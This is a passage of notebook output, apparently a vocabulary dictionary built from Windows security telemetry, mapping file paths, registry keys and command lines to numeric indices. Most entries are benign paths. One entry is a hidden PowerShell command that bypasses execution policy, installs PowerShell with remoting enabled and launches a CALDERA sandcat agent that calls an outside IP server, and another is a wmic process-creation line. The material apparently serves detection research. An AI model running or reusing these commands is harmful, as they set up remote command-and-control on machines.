       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release': 12,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\TempState\\\\.git': 13,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 14,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy': 15,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Licenses': 16,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings': 17,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AppData': 18,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sr\\\\.git': 19,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\sr-Latn-RS\\\\*': 20,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\.git': 21,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\en_US\\\\*': 22,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\windows_ie_ac_001\\\\AC\\\\Temp\\\\*': 23,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 24,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Windows PowerShell': 25,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings\\\\.git': 26,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AppData': 27,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalCache': 28,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\.git': 29,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fil\\\\*': 30,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCache': 31,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Site Characteristics Database': 32,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData\\\\.git': 33,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState\\\\.git': 34,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hu': 35,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\Settings': 36,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 37,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\3561288849sdhlie.files\\\\*': 38,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 39,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\*': 40,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 41,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 42,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\AutofillStrikeDatabase': 43,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC': 44,\n",
       " 'C:\\\\Users\\\\amanda90\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Storage-Account-Private-Container': 45,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\PeerDistRepub\\\\*': 46,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\fr': 47,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\zh_CN\\\\*': 48,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 49,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hi': 50,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 51,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\AppCache\\\\*': 52,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\TempState': 53,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 54,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\*': 55,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\.git': 56,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\.git': 57,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalState': 58,\n",
       " 'C:\\\\Windows\\\\SystemResources\\\\SspiCli.dll.mun': 59,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache': 60,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fi-FI\\\\*': 61,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetCookies': 62,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 63,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sw\\\\*': 64,\n",
       " 'C:\\\\Users\\\\wthornton\\\\Desktop\\\\DefenderControlrPortable': 65,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\docker\\\\caldera\\\\2.6.6-040520': 66,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hi': 67,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\Settings\\\\.git': 68,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 69,\n",
       " 'wmic process call create \"3ecfc67294923acdf6bd018a73f6c590\"': 70,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CO\\\\.git': 71,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\Settings\\\\*': 72,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 73,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\Local\\\\Microsoft': 74,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 75,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\.git': 76,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\TempState': 77,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\el\\\\.git': 78,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\*': 79,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\SystemAppData\\\\*': 80,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{D20BEEC4-5CA8-4905-AE3B-BF251EA09B53}\\\\StreamResource': 81,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\vi\\\\.git': 82,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\Settings': 83,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\entries\\\\*': 84,\n",
       " 'HKLM\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows': 85,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\.git': 86,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage\\\\*': 87,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\TempState\\\\*': 88,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\Settings\\\\.git': 89,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\lightTheme': 90,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\sl': 91,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 92,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 93,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\AC\\\\*': 94,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\faf4f793-ede9-45f4-b561-85e54c465501\\\\index-dir': 95,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 96,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\LocalCache\\\\*': 97,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\*': 98,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\*': 99,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fi\\\\*': 100,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 101,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mn\\\\.git': 102,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe': 103,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\UserData\\\\Low\\\\*': 104,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 105,\n",
       " 'LAMIRE': 106,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\LocalState\\\\.git': 107,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\TempState': 108,\n",
       " 'powershell.exe -ExecutionPolicy Bypass -C \"$wc=New-Object System.Net.WebClient;$output=\\\\\"PowerShellCore.msi\\\\\";$wc.DownloadFile(\\\\\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\\\\\", $output);Start-Process msiexec.exe -ArgumentList \\\\\"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\\\\\" -Wait;$env:Path += \\\\\";C:\\\\Program Files\\\\Powershell\\\\6\\\\\";Start-Process pwsh -ArgumentList \\\\\"-c C:\\\\Users\\\\Public\\\\sandcat.go-windows.exe -server http://38.147.122.251/tor/micro/d/flvnBFO7aooEi/Ota+OTBrjtJM1BFzugFRG097+uETM-b1yHYnAHWu7yp7zmoyOFxGqsz9cRU0R291Aja2grUo8-eMGUWrIcbejzmmBw9/C20Nm+kPahIjSR7LXOK1p9alA-CkxtwS2UygICgI/WxNuvFFIAkdXru+fDW4QvKllotgY-yFlyGn3HpVxpMlWynrfpAK89YcktX0EQOokfP6xH3UY-TOE28AOCTRZ0YlkAeqtvJRBwB2m364NzNqx/FodHulg-cSLxPPNnpt6xL78t+EZboeuMei3aMMtxONxqo7E/III-ePt1wNGrtXv2pLkN7dnN1AJA955txP3qNu4ogFHh5mA-oXRX4JMP5tu6maRf14qdA0zIzgr0BW0TFr5sJwTF8Jk-pf9FUFcxfnh93FBjGhNLLIpMm56IYQ4cUuBMQagjg2w-QxAhOV8Eva1GEfWLWefTP1xpjaf68kifwSM5xD/ggKo-45RsG3KOOV1AMmYVIhm03p1DkslwBJ1EPQo72okeLVw-Z95rTeP52h1ephLoLs0VtKCFhsE0HgBLZTxrA0COPOI-CW3/yBf6DxShImTL8iBNGnJ1hPKbomPgLQeXW7vbl2w-YMuFgzWl6vd3YsyBfYmMz1ZjcaMwrkxrqGm4heukkk8-Md01oo05BRzqYo0RxAnJv25xPvCq4vWpJYpJyPdYSWk-3E6F/v8oDIXrpdYqO/9vKpSnGLP4n65vGD4OSsnkKRs-ZjW2fQbq02b9FZugHtihwpD4l+ncReO1trDPoN/MCfU-Pcv5njv48Uc7pPSlud/7GYgOW5e4RB6f48eR6VvUDDc-VGTeayc4K1JLPg4ztvdoiuPhFsn98qnH9G9VFApURBo-bLFGrW+TBLYCUiJd1000JkM9Cqyqy4bRTDF3IvItYeE-OU9sIFld8CaR1onU8BFj62haoiMIyZ2sP80yznbjbpI-rfaREnpaJJmDxjU1WmPbOZC6zJhF2K4zcUuSxXIu5I4-XoCtpEI0rxeK7JJzhpvVsqt7OoDpEDTrqsWJoz34Wm4-44RH8wfKN6+88axDfQyf4PpcIZYr9oAbTnE9rs13+cY-/bqddtOsYADFqcY3Hr7Ma3K/V47nOeMWiTAD92wUm6w-dKfugxwTbM1DLf2bQQSfVWaK4hC8t/sMR347gm2I75k-6FcN1QuUDSTSg99JivGrpMkgW5K3lDf6q0bWLab7PpE-AO4mYpVOI9dCQU0Lfm0b9WF2AQr1nawIdqpuvXaP7Zs-fSP8WCqcUlJmLDzuu+FXcTXT2iKyD78F8JBIVXQy5lI-krq0rU54e+t/YWjYz3zkFSdYm/xJ4w05+TdMS9hBDuc-FDY9mctVGSVER3O8bmY/fLvEzQs2ym0Zv1XfMdqz6YE-EMtxZsoW1o/Oydn0gJtP2JCGbCEizbG2hcZxD6sHYZI-0PbfelOAFHUfIv9bHaEEEHiXOdm6YMqAYvj5z+JZjOE-E6sHCy6cIR0qbNEmMupoYJw3EtEa+U/7MQOd3OUL5iA-66wr1N4YtZsjJ137iPlI2+i2hbBjTXYcO4SuHu4f4aU-VurQmo2B9bJSGi+CXuRWmGUAcvl9zGLkiTBTY9+eaN4-X6Wy+2UNuOnr5S45BJZ2G/SW/ljkI2Aelk5LQ/LX990-ffS4Vi7SelAmAfAfg99+sYsEJ6hVMptyfRVCTO8Z4VI-ht47QIYzyoi3RId10pk3aUDNOUzOYjVlRwn2JCin3W0-7+MJqJv9+bnLaagu5+X2T2SsH/V5qKH4sSutsY6YHrs-W2EDPrLEw2xXm/t5ycdLiptKnDSKiohgp49UJRHxxwM-qfaXYWT/g0CIhyQ7mNo0hGW/FgBUAduKUF656y3OLLw-zTKZ6vpQuGDFilqKAlUipAs4p7td55kMvRxliVgjL/4-ZkExWn0zi4joCC/JRUtop9/yGRvfMQXCi91tn0jbjL0-8s3Ko09Tlq4po6ijiu1PJF4NwzQApiUwo7cW2SlDETM-uwtJo8CvR3KSpFMYF2ecg5gfnMybp5Ozda07ksIHnuE-sowskPXLCCoou4rbN1Jcp5uEvFKAacd95gGcqOB5+3I-Vqm4dbmPwI79h4kWgxiaDX4ECPg0ZzMkGspGnI8Dv9Y-u2ad6hdPBikkONK6VjQmtmqiYb4zV8Zi60uD5s2WzzU-Ic0GpWlupg/ybYcIyPiyW8aya66HghUfRvNAar5vJpg-KHixS4GtfQBeZBtmUlmV9C8YGqR27u7K1oRaYhoFD4Y-u//xDaipRj5moMsmlPZjHwf5M/kvhTWaDEn8cfyed+k-5TVcNnoOTOZ4yMNxB+P/Wb9O3/0805JeCPgkZ+NF/0g-Twpb6f6LxkXB2ZY81w8w5ON9hI3qAXh4np09NGX7C2U-+5IyA734bNyyqIuC0ovt/kmfm3w33bSpejuTYCqQNyw-rsUAsE7FqW6TtWyY75Ee6XYKgfgTxhJxyQ/B5ZM4sUw-Q8xyLKgyb6YUxj7NGVs76I0pm40QYx71YWNTkimCOfA-ifjMygOuIRU9mVRIxZH5qC7wcoaxjBeGrR6IIW9qbvw-WCfH2Bbd2adG1TcmhYdTqdk4X3ByX0d2FUaVp/dbNHE-qqGVJ3gmYGV9L4G3REakG8A5pjrzJ75i2tby2jZW368-cKFBSY1U2KjsNrFnQw3+WYfMG4Y64GiPM265hvyQ8TM-IuRWfxZNqNg2mVhJ/bOOq55oEESCQVvki2a4rhtA9/Y-IRxD3mug63kPZYQiDXs2Wh10L2Fh9091lv0dPs1F9dE - group CALDERA\\\\\" -WindowStyle hidden;\"': 109,\n",
       " 'C:\\\\Users\\\\inguyen\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog': 110,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 111,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\AC\\\\*': 112,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\.git': 113,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\Settings': 114,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\nl': 115,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\*': 116,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\*': 117,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\RoamingState\\\\.git': 118,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 119,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\TempState\\\\.git': 120,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 121,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\RoamingState\\\\*': 122,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp': 123,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 124,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\cache2\\\\doomed\\\\*': 125,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\da': 126,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 127,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\lt\\\\*': 128,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy': 129,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-1\\\\.git': 130,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-3\\\\.git': 131,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\.git': 132,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 133,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\ja\\\\.git': 134,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 135,\n",
